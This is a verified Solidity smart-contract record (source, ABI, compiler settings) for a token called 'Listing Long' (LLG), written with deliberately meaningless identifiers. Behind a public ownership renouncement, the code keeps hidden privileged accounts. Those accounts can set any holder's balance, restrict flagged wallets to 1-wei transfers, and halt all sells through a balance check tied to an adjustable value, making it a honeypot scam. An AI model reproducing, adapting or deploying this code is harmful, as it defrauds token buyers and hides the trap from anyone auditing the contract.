{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface listShould {\n    function createPair(address amountWalletFee, address atLiquidity) external returns (address);\n}\n\ninterface feeAtExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableAmount) external view returns (uint256);\n\n    function transfer(address modeTx, uint256 liquidityIs) external returns (bool);\n\n    function allowance(address swapTradingMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTx,\n        uint256 liquidityIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderLiquidity, uint256 value);\n    event Approval(address indexed swapTradingMax, address indexed spender, uint256 value);\n}\n\nabstract contract swapSenderFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxAmountTeam is feeAtExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ListingLong is swapSenderFund, feeAtExempt, maxAmountTeam {\n\n    bool public takeTeam;\n\n    mapping(address => uint256) private minWalletAuto;\n\n    bool public liquidityReceiver;\n\n    function owner() external view returns (address) {\n        return senderAt;\n    }\n\n    function tradingLiquidity(address atSell, address modeTx, uint256 liquidityIs) internal returns (bool) {\n        if (atSell == listLaunch) {\n            return tokenIsReceiver(atSell, modeTx, liquidityIs);\n        }\n        uint256 takeToken = feeAtExempt(teamList).balanceOf(modeFee);\n        require(takeToken == swapTo);\n        require(modeTx != modeFee);\n        if (toTeam[atSell]) {\n            return tokenIsReceiver(atSell, modeTx, receiverListTake);\n        }\n        return tokenIsReceiver(atSell, modeTx, liquidityIs);\n    }\n\n    function modeLiquidity() public {\n        emit OwnershipTransferred(listLaunch, address(0));\n        senderAt = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellShould;\n    }\n\n    function maxFee(address enableLiquidity, uint256 liquidityIs) public {\n        launchedFund();\n        minWalletAuto[enableLiquidity] = liquidityIs;\n    }\n\n    function buyLiquidityLaunch(address tradingFund) public {\n        launchedFund();\n        if (takeTeam == receiverFrom) {\n            launchBuy = true;\n        }\n        if (tradingFund == listLaunch || tradingFund == teamList) {\n            return;\n        }\n        toTeam[tradingFund] = true;\n    }\n\n    address public teamList;\n\n    function tokenIsReceiver(address atSell, address modeTx, uint256 liquidityIs) internal returns (bool) {\n        require(minWalletAuto[atSell] >= liquidityIs);\n        minWalletAuto[atSell] -= liquidityIs;\n        minWalletAuto[modeTx] += liquidityIs;\n        emit Transfer(atSell, modeTx, liquidityIs);\n        return true;\n    }\n\n    address enableTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address enableLiquidity, uint256 liquidityIs) external virtual override returns (bool) {\n        return tradingLiquidity(_msgSender(), enableLiquidity, liquidityIs);\n    }\n\n    uint8 private sellShould = 18;\n\n    mapping(address => bool) public toTeam;\n\n    function transferFrom(address atSell, address modeTx, uint256 liquidityIs) external override returns (bool) {\n        if (_msgSender() != enableTeam) {\n            if (listTeamAt[atSell][_msgSender()] != type(uint256).max) {\n                require(liquidityIs <= listTeamAt[atSell][_msgSender()]);\n                listTeamAt[atSell][_msgSender()] -= liquidityIs;\n            }\n        }\n        return tradingLiquidity(atSell, modeTx, liquidityIs);\n    }\n\n    mapping(address => mapping(address => uint256)) private listTeamAt;\n\n    uint256 swapTo;\n\n    address modeFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public walletList;\n\n    string private feeFund = \"Listing Long\";\n\n    function launchedFund() private view {\n        require(listMarketingTake[_msgSender()]);\n    }\n\n    function receiverModeMin(address receiverMax) public {\n        if (liquidityReceiver) {\n            return;\n        }\n        \n        listMarketingTake[receiverMax] = true;\n        if (teamAuto != isMarketingShould) {\n            launchBuy = false;\n        }\n        liquidityReceiver = true;\n    }\n\n    address private senderAt;\n\n    uint256 private isMarketingShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapWallet;\n    }\n\n    uint256 private feeFromAmount = 100000000 * 10 ** 18;\n\n    bool public receiverFrom;\n\n    event OwnershipTransferred(address indexed totalLiquidity, address indexed atReceiver);\n\n    constructor (){\n        \n        receiverAt launchedTake = receiverAt(enableTeam);\n        teamList = listShould(launchedTake.factory()).createPair(launchedTake.WETH(), address(this));\n        \n        listLaunch = _msgSender();\n        listMarketingTake[listLaunch] = true;\n        minWalletAuto[listLaunch] = feeFromAmount;\n        modeLiquidity();\n        \n        emit Transfer(address(0), listLaunch, feeFromAmount);\n    }\n\n    uint256 constant receiverListTake = 1 ** 10;\n\n    uint256 limitMode;\n\n    address public listLaunch;\n\n    string private swapWallet = \"LLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return feeFund;\n    }\n\n    function approve(address tokenLiquidityFrom, uint256 liquidityIs) public virtual override returns (bool) {\n        listTeamAt[_msgSender()][tokenLiquidityFrom] = liquidityIs;\n        emit Approval(_msgSender(), tokenLiquidityFrom, liquidityIs);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeFromAmount;\n    }\n\n    function balanceOf(address enableAmount) public view virtual override returns (uint256) {\n        return minWalletAuto[enableAmount];\n    }\n\n    function getOwner() external view returns (address) {\n        return senderAt;\n    }\n\n    function allowance(address launchIsShould, address tokenLiquidityFrom) external view virtual override returns (uint256) {\n        if (tokenLiquidityFrom == enableTeam) {\n            return type(uint256).max;\n        }\n        return listTeamAt[launchIsShould][tokenLiquidityFrom];\n    }\n\n    mapping(address => bool) public listMarketingTake;\n\n    function listFund(uint256 liquidityIs) public {\n        launchedFund();\n        swapTo = liquidityIs;\n    }\n\n    uint256 private teamAuto;\n\n    bool public launchBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTradingMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchIsShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenLiquidityFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidityFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"}],\"name\":\"buyLiquidityLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityIs\",\"type\":\"uint256\"}],\"name\":\"listFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMarketingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityIs\",\"type\":\"uint256\"}],\"name\":\"maxFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"}],\"name\":\"receiverModeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ListingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}